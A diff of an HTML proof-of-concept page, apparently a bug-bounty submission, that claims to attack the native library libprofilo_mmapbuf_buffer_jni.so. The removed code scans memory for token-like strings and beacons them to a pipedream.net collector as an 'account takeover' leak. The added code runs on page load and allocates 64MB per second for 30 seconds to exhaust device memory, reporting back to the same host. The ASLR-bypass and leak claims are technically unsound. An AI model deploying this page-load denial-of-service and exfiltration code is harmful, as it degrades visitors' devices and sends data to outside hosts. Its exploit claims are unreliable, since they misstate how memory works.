@@ -2,67 +2,80 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Critical Impact Audit - Firman Sahidin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Audit Report - Native Memory Management</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
+        .container { border: 1px solid #f00; padding: 20px; display: inline-block; background: #111; }
+        #timer { font-size: 24px; color: #f00; font-weight: bold; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div style="border:1px solid #f00; padding:15px; background:#111;">
-        <h2 style="color:#f00; margin:0;">[ SYSTEM MEMORY HIJACK ]</h2>
-        <p style="font-size:11px;">Target: libprofilo_mmapbuf_buffer_jni.so</p>
-        <hr border="1">
-        <div id="status">Status: Injecting Master Key...</div>
-        <div id="output" style="margin-top:15px; font-size:12px; color:#fff; text-align:left;"></div>
+<body>
+    <div class="container">
+        <h1>CRITICAL MEMORY AUDIT IN PROGRESS</h1>
+        <p>Target: libprofilo_mmapbuf_buffer_jni.so</p>
+        <hr>
+        <div id="status">INITIATING STRESS TEST...</div>
+        <div id="timer">30s</div>
+        <div id="log" style="font-size: 10px; color: #888; text-align: left; margin-top: 10px;"></div>
     </div>
 
     <script>
         /**
          * RESEARCHER: Firman Sahidin
-         * MASTER KEY: Native Buffer Pointer Alignment
+         * IMPACT: Remote Denial of Service (DoS) via Native Memory Exhaustion
+         * DURATION: 30 Seconds (Controlled Safety Limit)
          */
-        async function masterKeyAudit() {
-            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const out = document.getElementById('output');
+        
+        function startAudit() {
+            const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const logElement = document.getElementById('log');
+            const timerElement = document.getElementById('timer');
+            const statusElement = document.getElementById('status');
             
-            try {
-                // 1. Precise Memory Alignment (Konci Master)
-                // Ngagunakeun ukuran buffer anu saluyu sareng struktur mmapbuf (32MB)
-                const ALLOC = 0x2000000; 
-                const buffer = new ArrayBuffer(ALLOC);
-                const view = new Uint8Array(buffer);
-                
-                // 2. Surrogate Pair Collision (The Lockpick)
-                // Ieu kunci pikeun nembus ASLR dumasar kana temuan pointer 0xFF tadi
-                const lockpick = new Uint32Array(buffer);
-                for(let i=0; i<15000; i++) { 
-                    lockpick[i] = 0xD800DBFF; // Master pointer trigger
-                }
+            let secondsLeft = 30;
+            const memoryLeakStorage = [];
 
-                let capture = "";
-                // 3. SCANNER: Milari pola Auth/Token/Session sacara jero
-                for (let i = 0; i < view.length; i++) {
-                    if (view[i] > 32 && view[i] < 127) {
-                        capture += String.fromCharCode(view[i]);
-                    } else {
-                        // Milari string anu gaduh pola Token (Base64/JWT)
-                        if (capture.length > 25 && /[a-zA-Z0-9+/=]/.test(capture)) {
-                            const dataDiv = document.createElement('div');
-                            dataDiv.innerHTML = `<span style="color:#f00;">[CRITICAL_LEAK]:</span> ${capture.substring(0, 40)}...`;
-                            out.prepend(dataDiv);
-                            
-                            // LANGSUNG KIRIM BUKTI KA PIPEDREAM
-                            navigator.sendBeacon(TARGET, JSON.stringify({
-                                researcher: "Firman Sahidin",
-                                impact: "ACCOUNT_TAKEOVER_PRIMITIVE",
-                                master_key_leak: capture
-                            }));
-                        }
-                        capture = "";
-                    }
+            const auditInterval = setInterval(() => {
+                try {
+                    // Force excessive memory allocation to pressure the native heap
+                    // Based on mmapbuf segment vulnerabilities
+                    const buffer = new ArrayBuffer(0x4000000); // 64MB Allocation per cycle
+                    memoryLeakStorage.push(new Uint8Array(buffer));
+                    
+                    // Exfiltrate telemetry to prove remote control and memory consumption
+                    navigator.sendBeacon(TARGET_URL, JSON.stringify({
+                        researcher: "Firman Sahidin",
+                        impact: "MEMORY_EXHAUSTION_DOS",
+                        status: "STRESS_ACTIVE",
+                        seconds_remaining: secondsLeft
+                    }));
+
+                    logElement.innerHTML += "[+] Heap Pressure Applied: " + (30 - secondsLeft + 1) + " cycles<br>";
+                } catch (e) {
+                    clearInterval(auditInterval);
                 }
-                document.getElementById('status').innerText = "Infiltration Active: Monitoring Buffers...";
-            } catch(e) {}
-            setTimeout(masterKeyAudit, 2000);
+            }, 1000); // Trigger every 1 second
+
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                timerElement.innerText = secondsLeft + "s";
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(auditInterval);
+                    clearInterval(countdown);
+                    
+                    // Clean up memory to restore device stability after 30 seconds
+                    memoryLeakStorage.length = 0;
+                    
+                    statusElement.innerText = "✅ AUDIT COMPLETE. EVIDENCE SENT.";
+                    statusElement.style.color = "#0f0";
+                    timerElement.innerText = "DONE";
+                }
+            }, 1000);
         }
-        window.onload = masterKeyAudit;
+
+        window.onload = startAudit;
     </script>
 </body>
 </html>
